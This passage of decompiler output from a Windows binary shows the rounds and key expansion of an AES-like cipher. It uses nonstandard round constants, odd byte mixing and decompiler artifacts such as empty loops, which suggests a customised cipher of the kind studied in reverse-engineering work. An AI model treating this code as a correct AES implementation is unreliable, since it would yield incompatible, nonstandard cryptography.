  undefined8 uStack_230;
  undefined8 local_228;
  undefined8 uStack_220;
  undefined8 local_218;
  undefined8 uStack_210;
  undefined8 local_208;
  undefined8 uStack_200;
  undefined8 local_1f8;
  undefined8 uStack_1f0;
  undefined8 local_1e8;
  undefined8 uStack_1e0;
  undefined8 local_1d8;
  undefined8 uStack_1d0;
  undefined8 local_1c8;
  undefined8 uStack_1c0;
  undefined8 local_1b8;
  undefined8 uStack_1b0;
  undefined8 local_1a8;
  undefined8 uStack_1a0;
  undefined8 local_198;
  undefined8 uStack_190;
  undefined8 local_188;
  undefined8 uStack_180;
  undefined8 local_178;
  undefined8 uStack_170;
  undefined8 local_168;
  undefined8 uStack_160;
  undefined8 local_158;
  undefined8 uStack_150;
  undefined8 local_148;
  undefined8 uStack_140;
  undefined8 local_138;
  undefined8 uStack_130;
  undefined8 local_128;
  undefined8 uStack_120;
  undefined8 local_118;
  undefined8 uStack_110;
  undefined8 local_108;
  undefined8 uStack_100;
  undefined8 local_f8;
  undefined8 uStack_f0;
  undefined8 local_e8;
  undefined8 uStack_e0;
  undefined8 local_d8;
  undefined8 uStack_d0;
  uint local_c8;
  uint uStack_c4;
  uint uStack_c0;
  uint uStack_bc;
  undefined8 local_b8;
  undefined8 uStack_b0;
  undefined8 local_a8;
  undefined8 uStack_a0;
  undefined8 local_98;
  undefined8 uStack_90;
  undefined8 local_88;
  undefined8 uStack_80;
  undefined8 local_78;
  undefined8 uStack_70;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 local_58;
  undefined8 uStack_50;
  undefined8 *local_48;
  
  local_d8 = *(undefined8 *)(param_1 + 4);
  uStack_d0 = *(undefined8 *)(param_1 + 6);
  local_108 = *(undefined8 *)(param_1 + 8);
  uStack_100 = *(undefined8 *)(param_1 + 10);
  local_138 = *(undefined8 *)(param_1 + 0xc);
  uStack_130 = *(undefined8 *)(param_1 + 0xe);
  local_168 = *(undefined8 *)(param_1 + 0x10);
  uStack_160 = *(undefined8 *)(param_1 + 0x12);
  local_198 = *(undefined8 *)(param_1 + 0x14);
  uStack_190 = *(undefined8 *)(param_1 + 0x16);
  local_1c8 = *(undefined8 *)(param_1 + 0x18);
  uStack_1c0 = *(undefined8 *)(param_1 + 0x1a);
  local_1f8 = *(undefined8 *)(param_1 + 0x1c);
  uStack_1f0 = *(undefined8 *)(param_1 + 0x1e);
  local_58 = *(undefined8 *)(param_1 + 0x20);
  uStack_50 = *(undefined8 *)(param_1 + 0x22);
  local_68 = *(undefined8 *)(param_1 + 0x24);
  uStack_60 = *(undefined8 *)(param_1 + 0x26);
  local_78 = *(undefined8 *)(param_1 + 0x28);
  uStack_70 = *(undefined8 *)(param_1 + 0x2a);
  local_88 = *(undefined8 *)(param_1 + 0x2c);
  uStack_80 = *(undefined8 *)(param_1 + 0x2e);
  local_98 = *(undefined8 *)(param_1 + 0x30);
  uStack_90 = *(undefined8 *)(param_1 + 0x32);
  local_a8 = *(undefined8 *)(param_1 + 0x34);
  uStack_a0 = *(undefined8 *)(param_1 + 0x36);
  local_b8 = *(undefined8 *)(param_1 + 0x38);
  uStack_b0 = *(undefined8 *)(param_1 + 0x3a);
  local_c8 = *param_3 ^ *param_1;
  uStack_c4 = param_3[1] ^ param_1[1];
  uStack_c0 = param_3[2] ^ param_1[2];
  uStack_bc = param_3[3] ^ param_1[3];
  local_48 = param_2;
  FUN_140005e9f((uint *)&local_e8,&local_c8,(uint *)&local_d8);
  local_f8 = local_e8;
  uStack_f0 = uStack_e0;
  FUN_140005e9f((uint *)&local_118,(undefined4 *)&local_f8,(uint *)&local_108);
  local_128 = local_118;
  uStack_120 = uStack_110;
  FUN_140005e9f((uint *)&local_148,(undefined4 *)&local_128,(uint *)&local_138);
  local_158 = local_148;
  uStack_150 = uStack_140;
  FUN_140005e9f((uint *)&local_178,(undefined4 *)&local_158,(uint *)&local_168);
  local_188 = local_178;
  uStack_180 = uStack_170;
  FUN_140005cd5((uint *)&local_1a8,(uint *)&local_188,(uint *)&local_198);
  local_1b8 = local_1a8;
  uStack_1b0 = uStack_1a0;
  FUN_140005cd5((uint *)&local_1d8,(uint *)&local_1b8,(uint *)&local_1c8);
  local_1e8 = local_1d8;
  uStack_1e0 = uStack_1d0;
  FUN_140005cd5((uint *)&local_208,(uint *)&local_1e8,(uint *)&local_1f8);
  local_218 = local_208;
  uStack_210 = uStack_200;
  FUN_140005cd5((uint *)&local_228,(uint *)&local_218,(uint *)&local_58);
  local_238 = local_228;
  uStack_230 = uStack_220;
  FUN_140005cd5((uint *)&local_248,(uint *)&local_238,(uint *)&local_68);
  local_258 = local_248;
  uStack_250 = uStack_240;
  FUN_140005cd5((uint *)&local_268,(uint *)&local_258,(uint *)&local_78);
  local_278 = local_268;
  uStack_270 = uStack_260;
  FUN_140005cd5((uint *)&local_288,(uint *)&local_278,(uint *)&local_88);
  local_298 = local_288;
  uStack_290 = uStack_280;
  FUN_140005cd5((uint *)&local_2a8,(uint *)&local_298,(uint *)&local_98);
  local_2b8 = local_2a8;
  uStack_2b0 = uStack_2a0;
  FUN_140005e9f((uint *)&local_2c8,(undefined4 *)&local_2b8,(uint *)&local_a8);
  local_2d8 = local_2c8;
  uStack_2d0 = uStack_2c0;
  FUN_140005b71((uint *)&local_2e8,(undefined4 *)&local_2d8,(uint *)&local_b8);
  *local_48 = local_2e8;
  local_48[1] = uStack_2e0;
  return;
}


// ==== FUN_140005b71 @ 140005b71 size 356

void FUN_140005b71(uint *param_1,undefined4 *param_2,uint *param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint local_a4;
  uint local_a0;
  uint local_9c;
  uint *local_98;
  uint local_90;
  uint local_8c;
  uint local_88;
  uint local_84;
  uint local_80;
  undefined4 local_7c;
  
  uVar1 = *param_2;
  uVar2 = param_2[1];
  uVar3 = param_2[2];
  uVar4 = param_2[3];
  local_84 = uVar3 >> 8;
  local_88 = uVar4 >> 8;
  uVar5 = *param_3;
  uVar6 = param_3[1];
  uVar7 = param_3[2];
  uVar8 = param_3[3];
  local_98 = param_1;
  local_8c = uVar4;
  local_80 = uVar3;
  local_7c = uVar2;
  FUN_140005e23((undefined1 *)&local_90,0x1400193c0,(byte)uVar1,(byte)((uint)uVar2 >> 8),
                (byte)(uVar3 >> 0x10),(byte)(uVar4 >> 0x18));
  FUN_140005e23((undefined1 *)&local_9c,0x1400193c0,(byte)local_7c,(byte)local_84,
                (byte)(uVar4 >> 0x10),(byte)((uint)uVar1 >> 0x18));
  FUN_140005e23((undefined1 *)&local_a0,0x1400193c0,(byte)local_80,(byte)local_88,
                (byte)((uint)uVar1 >> 0x10),(byte)((uint)uVar2 >> 0x18));
  FUN_140005e23((undefined1 *)&local_a4,0x1400193c0,(byte)local_8c,(byte)((uint)uVar1 >> 8),
                (byte)((uint)uVar2 >> 0x10),(byte)(uVar3 >> 0x18));
  *local_98 = local_90 ^ uVar5;
  local_98[1] = local_9c ^ uVar6;
  local_98[2] = local_a0 ^ uVar7;
  local_98[3] = local_a4 ^ uVar8;
  return;
}


// ==== FUN_140005cd5 @ 140005cd5 size 334

void FUN_140005cd5(uint *param_1,uint *param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  
  uVar1 = *param_2;
  uVar2 = param_2[1];
  uVar3 = param_2[2];
  uVar4 = param_2[3];
  uVar5 = *(uint *)(&DAT_1400183c0 + (ulonglong)(uVar2 & 0xff) * 4);
  uVar6 = *(uint *)(&DAT_1400183c0 + (ulonglong)(uVar3 & 0xff) * 4);
  uVar7 = *(uint *)(&DAT_1400183c0 + (ulonglong)(uVar4 & 0xff) * 4);
  uVar8 = param_3[1];
  uVar9 = *(uint *)(&DAT_1400187c0 + (ulonglong)(uVar3 >> 8 & 0xff) * 4);
  uVar10 = param_3[2];
  uVar11 = *(uint *)(&DAT_1400187c0 + (ulonglong)(uVar4 >> 8 & 0xff) * 4);
  uVar12 = param_3[3];
  uVar13 = *(uint *)(&DAT_1400187c0 + (ulonglong)(uVar1 >> 8 & 0xff) * 4);
  uVar14 = *(uint *)(&DAT_140018bc0 + (uVar4 >> 0xe & 0x3fc));
  uVar15 = *(uint *)(&DAT_140018bc0 + (uVar1 >> 0xe & 0x3fc));
  uVar16 = *(uint *)(&DAT_140018bc0 + (uVar2 >> 0xe & 0x3fc));
  uVar17 = *(uint *)(&DAT_140018fc0 + (ulonglong)(uVar1 >> 0x18) * 4);
  uVar18 = *(uint *)(&DAT_140018fc0 + (ulonglong)(uVar2 >> 0x18) * 4);
  uVar19 = *(uint *)(&DAT_140018fc0 + (ulonglong)(uVar3 >> 0x18) * 4);
  *param_1 = *(uint *)(&DAT_1400183c0 + (ulonglong)(uVar1 & 0xff) * 4) ^ *param_3 ^
             *(uint *)(&DAT_1400187c0 + (ulonglong)(uVar2 >> 8 & 0xff) * 4) ^
             *(uint *)(&DAT_140018bc0 + (uVar3 >> 0xe & 0x3fc)) ^
             *(uint *)(&DAT_140018fc0 + (ulonglong)(uVar4 >> 0x18) * 4);
  param_1[1] = uVar5 ^ uVar8 ^ uVar9 ^ uVar14 ^ uVar17;
  param_1[2] = uVar6 ^ uVar10 ^ uVar11 ^ uVar15 ^ uVar18;
  param_1[3] = uVar7 ^ uVar12 ^ uVar13 ^ uVar16 ^ uVar19;
  return;
}


// ==== FUN_140005e23 @ 140005e23 size 124

void FUN_140005e23(undefined1 *param_1,longlong param_2,byte param_3,byte param_4,byte param_5,
                  byte param_6)

{
  undefined1 uVar1;
  undefined1 uVar2;
  undefined1 uVar3;
  longlong lVar4;
  
  uVar1 = *(undefined1 *)(param_2 + (ulonglong)param_4);
  uVar2 = *(undefined1 *)(param_2 + (ulonglong)param_5);
  uVar3 = *(undefined1 *)(param_2 + (ulonglong)param_6);
  for (lVar4 = 0; lVar4 != 4; lVar4 = lVar4 + 1) {
  }
  *param_1 = *(undefined1 *)(param_2 + (ulonglong)param_3);
  param_1[1] = uVar1;
  param_1[2] = uVar2;
  param_1[3] = uVar3;
  return;
}


// ==== FUN_140005e9f @ 140005e9f size 390

void FUN_140005e9f(uint *param_1,undefined4 *param_2,uint *param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint local_e8;
  uint uStack_e4;
  uint uStack_e0;
  uint uStack_dc;
  uint local_d8;
  uint uStack_d4;
  uint uStack_d0;
  uint uStack_cc;
  uint local_c8;
  uint uStack_c4;
  uint uStack_c0;
  uint uStack_bc;
  uint local_b8;
  uint uStack_b4;
  uint uStack_b0;
  uint uStack_ac;
  uint *local_a8;
  uint local_9c;
  uint local_98;
  uint local_94;
  uint local_90;
  uint local_8c;
  
  uVar1 = *param_2;
  uVar2 = param_2[1];
  uVar3 = param_2[2];
  local_9c = param_2[3];
  local_94 = uVar3 >> 8;
  local_90 = local_9c >> 0x10;
  local_98 = local_9c >> 8;
  uVar4 = *param_3;
  uVar5 = param_3[1];
  uVar6 = param_3[2];
  uVar7 = param_3[3];
  local_a8 = param_1;
  local_8c = uVar3;
  FUN_140006025(&local_b8,(byte)uVar1,(byte)((uint)uVar2 >> 8),(byte)(uVar3 >> 0x10),
                (byte)(local_9c >> 0x18));
  FUN_140006025(&local_c8,(byte)uVar2,(byte)local_94,(byte)local_90,(byte)((uint)uVar1 >> 0x18));
  FUN_140006025(&local_d8,(byte)local_8c,(byte)local_98,(byte)((uint)uVar1 >> 0x10),
                (byte)((uint)uVar2 >> 0x18));
  FUN_140006025(&local_e8,(byte)local_9c,(byte)((uint)uVar1 >> 8),(byte)((uint)uVar2 >> 0x10),
                (byte)(uVar3 >> 0x18));
  *local_a8 = uStack_ac ^ uStack_b0 ^ uStack_b4 ^ local_b8 ^ uVar4;
  local_a8[1] = uStack_bc ^ uStack_c0 ^ uStack_c4 ^ local_c8 ^ uVar5;
  local_a8[2] = uStack_cc ^ uStack_d0 ^ uStack_d4 ^ local_d8 ^ uVar6;
  local_a8[3] = uStack_dc ^ uStack_e0 ^ uStack_e4 ^ local_e8 ^ uVar7;
  return;
}


// ==== FUN_140006025 @ 140006025 size 304

void FUN_140006025(uint *param_1,byte param_2,byte param_3,byte param_4,byte param_5)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  longlong lVar5;
  longlong lVar6;
  uint local_80 [4];
  uint local_70 [4];
  uint local_60 [4];
  uint local_50 [6];
  
  puVar4 = local_50;
  for (lVar6 = 0; lVar6 != 0x400; lVar6 = lVar6 + 0x100) {
    puVar4[-0xc] = *(uint *)(&DAT_1400173c0 + (ulonglong)(param_2 & 0x3f) * 4 + lVar6);
    puVar4[-8] = *(uint *)(&DAT_1400173c0 + (ulonglong)(param_3 & 0x3f) * 4 + lVar6);
    puVar4[-4] = *(uint *)(&DAT_1400173c0 + (ulonglong)(param_4 & 0x3f) * 4 + lVar6);
    *puVar4 = *(uint *)(&DAT_1400173c0 + (ulonglong)((param_5 & 0x3f) << 2) + lVar6);
    puVar4 = puVar4 + 1;
  }
  for (lVar6 = 0; lVar6 != 4; lVar6 = lVar6 + 1) {
    for (lVar5 = 0; lVar5 != 4; lVar5 = lVar5 + 1) {
    }
  }
  uVar1 = local_70[param_3 >> 6];
  uVar2 = local_60[param_4 >> 6];
  uVar3 = local_50[param_5 >> 6];
  *param_1 = local_80[param_2 >> 6];
  param_1[1] = uVar1 << 8 | uVar1 >> 0x18;
  param_1[2] = uVar2 << 0x10 | uVar2 >> 0x10;
  param_1[3] = uVar3 << 0x18 | uVar3 >> 8;
  return;
}


// ==== FUN_140006155 @ 140006155 size 1238

uint * FUN_140006155(uint *param_1,uint *param_2)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  uint uVar25;
  uint uVar26;
  uint uVar27;
  uint uVar28;
  uint uVar29;
  uint uVar30;
  uint uVar31;
  uint uVar32;
  uint uVar33;
  uint uVar34;
  uint uVar35;
  uint uVar36;
  uint uVar37;
  uint uVar38;
  uint uVar39;
  uint uVar40;
  uint uVar41;
  uint uVar42;
  uint uVar43;
  uint uVar44;
  uint uVar45;
  uint uVar46;
  uint uVar47;
  uint uVar48;
  uint uVar49;
  uint uVar50;
  uint uVar51;
  uint uVar52;
  uint uVar53;
  uint uVar54;
  uint uVar55;
  uint uVar56;
  uint uVar57;
  uint uVar58;
  uint uVar59;
  uint uVar60;
  uint uVar61;
  uint uVar62;
  
  uVar35 = *param_2;
  uVar51 = param_2[1];
  uVar52 = param_2[2];
  uVar55 = param_2[3];
  uVar1 = param_2[4];
  uVar2 = param_2[5];
  uVar3 = param_2[6];
  uVar4 = param_2[7];
  uVar58 = uVar52 >> 0x18 | (uVar52 & 0xff0000) >> 8 | (uVar52 & 0xff00) << 8 | uVar52 << 0x18;
  uVar53 = uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 << 0x18;
  uVar5 = uVar4 >> 0x18 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8;
  uVar36 = uVar5 | uVar4 << 0x18;
  uVar5 = FUN_1400068de(uVar5 << 8 | uVar4 & 0xff);
  uVar37 = uVar35 ^ 1;
  uVar5 = (uVar35 >> 0x18 | (uVar37 & 0xff0000) >> 8 | (uVar37 & 0xff00) << 8 | uVar37 << 0x18) ^
          uVar5;
  uVar56 = (uVar51 >> 0x18 | (uVar51 & 0xff0000) >> 8 | (uVar51 & 0xff00) << 8 | uVar51 << 0x18) ^
           uVar5;
  uVar37 = uVar56 ^ uVar58;
  uVar61 = (uVar55 >> 0x18 | (uVar55 & 0xff0000) >> 8 | (uVar55 & 0xff00) << 8 | uVar55 << 0x18) ^
           uVar37;
  uVar6 = FUN_1400068de(uVar61);
  uVar6 = uVar6 ^ (uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18);
  uVar7 = uVar6 ^ uVar53;
  uVar57 = (uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18) ^ uVar7
  ;
  uVar38 = uVar57 ^ uVar36;
  uVar8 = FUN_1400068de(uVar38 << 8 | uVar38 >> 0x18);
  uVar8 = uVar8 ^ uVar5;
  uVar9 = uVar8 ^ 0x2000000;
  uVar39 = uVar9 ^ uVar56;
  uVar58 = uVar58 ^ uVar9;
  uVar40 = uVar58 ^ uVar61;
  uVar10 = FUN_1400068de(uVar40);
  uVar53 = uVar53 ^ uVar10;
  uVar10 = uVar10 ^ uVar6;
  uVar11 = uVar57 ^ uVar53;
  uVar41 = uVar53 ^ uVar36;
  uVar12 = FUN_1400068de(uVar41 << 8 | uVar41 >> 0x18);
  uVar12 = uVar12 ^ uVar8;
  uVar13 = uVar12 ^ 0x6000000;
  uVar42 = uVar13 ^ uVar39;
  uVar14 = uVar42 ^ uVar58;
  uVar43 = uVar42 ^ uVar61;
  uVar15 = FUN_1400068de(uVar43);
  uVar15 = uVar15 ^ uVar10;
  uVar44 = uVar15 ^ uVar53;
  uVar16 = uVar15 ^ uVar57;
  uVar17 = uVar16 ^ uVar41;
  uVar18 = FUN_1400068de(uVar17 << 8 | uVar17 >> 0x18);
  uVar18 = uVar18 ^ uVar12;
  uVar19 = uVar18 ^ 0xe000000;
  uVar54 = uVar19 ^ uVar42;
  uVar20 = uVar19 ^ uVar58;
  uVar45 = uVar20 ^ uVar43;
  uVar21 = FUN_1400068de(uVar45);
  uVar36 = uVar36 ^ uVar21;
  uVar59 = uVar21 ^ uVar15;
  uVar21 = uVar21 ^ uVar53;
  uVar22 = uVar21 ^ uVar16;
  uVar23 = FUN_1400068de(uVar36 << 8 | uVar36 >> 0x18);
  uVar23 = uVar23 ^ uVar18;
  uVar24 = uVar23 ^ 0x1e000000;
  uVar46 = uVar24 ^ uVar54;
  uVar25 = uVar46 ^ uVar20;
  uVar47 = uVar46 ^ uVar43;
  uVar26 = FUN_1400068de(uVar47);
  uVar26 = uVar26 ^ uVar59;
  uVar48 = uVar26 ^ uVar21;
  uVar27 = uVar26 ^ uVar16;
  uVar28 = uVar27 ^ uVar36;
  uVar29 = FUN_1400068de(uVar28 << 8 | uVar28 >> 0x18);
  uVar29 = uVar29 ^ uVar23;
  uVar62 = uVar29 ^ 0x3e000000;
  uVar30 = uVar62 ^ uVar46;
  uVar49 = uVar62 ^ uVar20;
  uVar50 = uVar49 ^ uVar47;
  uVar31 = FUN_1400068de(uVar50);
  uVar32 = uVar31 ^ uVar26;
  uVar31 = uVar31 ^ uVar21;
  uVar60 = uVar31 ^ uVar27;
  uVar33 = uVar31 ^ uVar36;
  uVar34 = FUN_1400068de(uVar33 << 8 | uVar33 >> 0x18);
  *param_1 = uVar35;
  param_1[1] = uVar51;
  param_1[2] = uVar52;
  param_1[3] = uVar55;
  param_1[4] = uVar1;
  param_1[5] = uVar2;
  param_1[6] = uVar3;
  param_1[7] = uVar4;
  param_1[8] = uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 << 0x18;
  param_1[9] = uVar56 >> 0x18 | (uVar56 & 0xff0000) >> 8 | (uVar56 & 0xff00) << 8 | uVar56 << 0x18;
  param_1[10] = uVar37 >> 0x18 | (uVar37 & 0xff0000) >> 8 | (uVar37 & 0xff00) << 8 | uVar37 << 0x18;
  param_1[0xb] = uVar61 >> 0x18 | (uVar61 & 0xff0000) >> 8 | (uVar61 & 0xff00) << 8 | uVar61 << 0x18
  ;
  param_1[0xc] = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
  param_1[0xd] = uVar7 >> 0x18 | (uVar7 & 0xff0000) >> 8 | (uVar7 & 0xff00) << 8 | uVar7 << 0x18;
  param_1[0xe] = uVar57 >> 0x18 | (uVar57 & 0xff0000) >> 8 | (uVar57 & 0xff00) << 8 | uVar57 << 0x18
  ;
  param_1[0xf] = uVar38 >> 0x18 | (uVar38 & 0xff0000) >> 8 | (uVar38 & 0xff00) << 8 | uVar38 << 0x18
  ;
  param_1[0x10] = uVar9 >> 0x18 | (uVar9 & 0xff0000) >> 8 | (uVar9 & 0xff00) << 8 | uVar8 << 0x18;
  param_1[0x11] =
       uVar39 >> 0x18 | (uVar39 & 0xff0000) >> 8 | (uVar39 & 0xff00) << 8 | uVar39 << 0x18;
  param_1[0x12] =
       uVar58 >> 0x18 | (uVar58 & 0xff0000) >> 8 | (uVar58 & 0xff00) << 8 | uVar58 << 0x18;
  param_1[0x13] =
       uVar40 >> 0x18 | (uVar40 & 0xff0000) >> 8 | (uVar40 & 0xff00) << 8 | uVar40 << 0x18;
  param_1[0x14] =
       uVar10 >> 0x18 | (uVar10 & 0xff0000) >> 8 | (uVar10 & 0xff00) << 8 | uVar10 << 0x18;
  param_1[0x15] =
       uVar53 >> 0x18 | (uVar53 & 0xff0000) >> 8 | (uVar53 & 0xff00) << 8 | uVar53 << 0x18;
  param_1[0x16] =
       uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 << 0x18;
  param_1[0x17] =
       uVar41 >> 0x18 | (uVar41 & 0xff0000) >> 8 | (uVar41 & 0xff00) << 8 | uVar41 << 0x18;
  param_1[0x18] =
       uVar13 >> 0x18 | (uVar13 & 0xff0000) >> 8 | (uVar13 & 0xff00) << 8 | uVar12 << 0x18;
  param_1[0x19] =
       uVar42 >> 0x18 | (uVar42 & 0xff0000) >> 8 | (uVar42 & 0xff00) << 8 | uVar42 << 0x18;
  param_1[0x1a] =
       uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;
  param_1[0x1b] =
       uVar43 >> 0x18 | (uVar43 & 0xff0000) >> 8 | (uVar43 & 0xff00) << 8 | uVar43 << 0x18;
  param_1[0x1c] =
       uVar15 >> 0x18 | (uVar15 & 0xff0000) >> 8 | (uVar15 & 0xff00) << 8 | uVar15 << 0x18;
  param_1[0x1d] =
       uVar44 >> 0x18 | (uVar44 & 0xff0000) >> 8 | (uVar44 & 0xff00) << 8 | uVar44 << 0x18;
  param_1[0x1e] =
       uVar16 >> 0x18 | (uVar16 & 0xff0000) >> 8 | (uVar16 & 0xff00) << 8 | uVar16 << 0x18;
  param_1[0x1f] =
       uVar17 >> 0x18 | (uVar17 & 0xff0000) >> 8 | (uVar17 & 0xff00) << 8 | uVar17 << 0x18;
  param_1[0x20] =
       uVar19 >> 0x18 | (uVar19 & 0xff0000) >> 8 | (uVar19 & 0xff00) << 8 | uVar18 << 0x18;
  param_1[0x21] =
       uVar54 >> 0x18 | (uVar54 & 0xff0000) >> 8 | (uVar54 & 0xff00) << 8 | uVar54 << 0x18;
  param_1[0x22] =
       uVar20 >> 0x18 | (uVar20 & 0xff0000) >> 8 | (uVar20 & 0xff00) << 8 | uVar20 << 0x18;
  param_1[0x23] =
       uVar45 >> 0x18 | (uVar45 & 0xff0000) >> 8 | (uVar45 & 0xff00) << 8 | uVar45 << 0x18;
  param_1[0x24] =
       uVar59 >> 0x18 | (uVar59 & 0xff0000) >> 8 | (uVar59 & 0xff00) << 8 | uVar59 << 0x18;
  param_1[0x25] =
       uVar21 >> 0x18 | (uVar21 & 0xff0000) >> 8 | (uVar21 & 0xff00) << 8 | uVar21 << 0x18;
  param_1[0x26] =
       uVar22 >> 0x18 | (uVar22 & 0xff0000) >> 8 | (uVar22 & 0xff00) << 8 | uVar22 << 0x18;
  param_1[0x27] =
       uVar36 >> 0x18 | (uVar36 & 0xff0000) >> 8 | (uVar36 & 0xff00) << 8 | uVar36 << 0x18;
  param_1[0x28] =
       uVar24 >> 0x18 | (uVar24 & 0xff0000) >> 8 | (uVar24 & 0xff00) << 8 | uVar23 << 0x18;
  param_1[0x29] =
       uVar46 >> 0x18 | (uVar46 & 0xff0000) >> 8 | (uVar46 & 0xff00) << 8 | uVar46 << 0x18;
  param_1[0x2a] =
       uVar25 >> 0x18 | (uVar25 & 0xff0000) >> 8 | (uVar25 & 0xff00) << 8 | uVar25 << 0x18;
  uVar35 = uVar34 ^ uVar29 ^ 0x7e000000;
  uVar52 = uVar35 ^ uVar30;
  uVar51 = uVar52 ^ uVar47;
  param_1[0x2b] =
       uVar47 >> 0x18 | (uVar47 & 0xff0000) >> 8 | (uVar47 & 0xff00) << 8 | uVar47 << 0x18;
  param_1[0x2c] =
       uVar26 >> 0x18 | (uVar26 & 0xff0000) >> 8 | (uVar26 & 0xff00) << 8 | uVar26 << 0x18;
  param_1[0x2d] =
       uVar48 >> 0x18 | (uVar48 & 0xff0000) >> 8 | (uVar48 & 0xff00) << 8 | uVar48 << 0x18;
  param_1[0x2e] =
       uVar27 >> 0x18 | (uVar27 & 0xff0000) >> 8 | (uVar27 & 0xff00) << 8 | uVar27 << 0x18;
  param_1[0x2f] =
       uVar28 >> 0x18 | (uVar28 & 0xff0000) >> 8 | (uVar28 & 0xff00) << 8 | uVar28 << 0x18;
  param_1[0x30] =
       uVar62 >> 0x18 | (uVar62 & 0xff0000) >> 8 | (uVar62 & 0xff00) << 8 | uVar29 << 0x18;
  param_1[0x31] =
       uVar30 >> 0x18 | (uVar30 & 0xff0000) >> 8 | (uVar30 & 0xff00) << 8 | uVar30 << 0x18;
  uVar55 = uVar52 ^ uVar49;
  param_1[0x32] =
       uVar49 >> 0x18 | (uVar49 & 0xff0000) >> 8 | (uVar49 & 0xff00) << 8 | uVar49 << 0x18;
  param_1[0x33] =
       uVar50 >> 0x18 | (uVar50 & 0xff0000) >> 8 | (uVar50 & 0xff00) << 8 | uVar50 << 0x18;
  param_1[0x34] =
       uVar32 >> 0x18 | (uVar32 & 0xff0000) >> 8 | (uVar32 & 0xff00) << 8 | uVar32 << 0x18;
  param_1[0x35] =
       uVar31 >> 0x18 | (uVar31 & 0xff0000) >> 8 | (uVar31 & 0xff00) << 8 | uVar31 << 0x18;
  param_1[0x36] =
       uVar60 >> 0x18 | (uVar60 & 0xff0000) >> 8 | (uVar60 & 0xff00) << 8 | uVar60 << 0x18;
  param_1[0x37] =
       uVar33 >> 0x18 | (uVar33 & 0xff0000) >> 8 | (uVar33 & 0xff00) << 8 | uVar33 << 0x18;
  param_1[0x38] =
       uVar35 >> 0x18 | (uVar35 & 0xff0000) >> 8 | (uVar35 & 0xff00) << 8 |
       (uVar34 ^ uVar29) << 0x18;
  param_1[0x39] =
       uVar52 >> 0x18 | (uVar52 & 0xff0000) >> 8 | (uVar52 & 0xff00) << 8 | uVar52 << 0x18;
  param_1[0x3a] =
       uVar55 >> 0x18 | (uVar55 & 0xff0000) >> 8 | (uVar55 & 0xff00) << 8 | uVar55 << 0x18;
  param_1[0x3b] =
       uVar51 >> 0x18 | (uVar51 & 0xff0000) >> 8 | (uVar51 & 0xff00) << 8 | uVar51 << 0x18;
  return param_1;
}


// ==== FUN_14000662b @ 14000662b size 691

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000662b(ulonglong *param_1,longlong param_2,ulonglong param_3)

{
  char *pcVar1;
  undefined8 uVar2;
  char cVar3;
  undefined4 uVar4;
  ulonglong uVar5;
  undefined1 uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  byte bVar9;
  byte bVar10;
  short sVar11;
  byte bVar19;
  byte bVar20;
  undefined1 auVar12 [16];
  undefined1 auVar13 [16];
  undefined1 auVar14 [16];
  byte bVar17;
  undefined1 auVar15 [16];
  undefined1 auVar16 [16];
  undefined1 auVar21 [16];
  undefined1 auVar22 [16];
  undefined1 auVar23 [16];
  undefined1 auVar24 [16];
  byte bVar25;
  ushort uVar27;
  byte bVar40;
  ushort uVar42;
  short sVar46;
  short sVar49;
  byte bVar50;
  byte bVar51;
  byte bVar52;
  undefined1 auVar29 [16];
  undefined1 auVar30 [16];
  byte bVar38;
  byte bVar43;
  byte bVar53;
  undefined1 auVar31 [16];
  undefined1 auVar32 [16];
  undefined1 auVar33 [16];
  undefined1 auVar34 [16];
  undefined1 auVar35 [16];
  undefined1 auVar36 [16];
  undefined1 auVar37 [16];
  undefined4 local_14;
  undefined3 uStack_10;
  undefined1 auVar18 [15];
  char cVar26;
  short sVar28;
  char cVar39;
  char cVar41;
  char cVar44;
  char cVar45;
  char cVar47;
  char cVar48;
  
  if (param_3 != 0) {
    bVar10 = DAT_140017000;
    if (param_3 < 0x21) {
      uVar5 = 0;
    }
    else {
      uVar7 = 0;
      do {
        pcVar1 = (char *)(param_2 + uVar7);
        auVar13[0] = -(*pcVar1 == '\0');
        auVar13[1] = -(pcVar1[1] == '\0');
        auVar13[2] = -(pcVar1[2] == '\0');
        auVar13[3] = -(pcVar1[3] == '\0');
        auVar13[4] = -(pcVar1[4] == '\0');
        auVar13[5] = -(pcVar1[5] == '\0');
        auVar13[6] = -(pcVar1[6] == '\0');
        auVar13[7] = -(pcVar1[7] == '\0');
        auVar13[8] = -(pcVar1[8] == '\0');
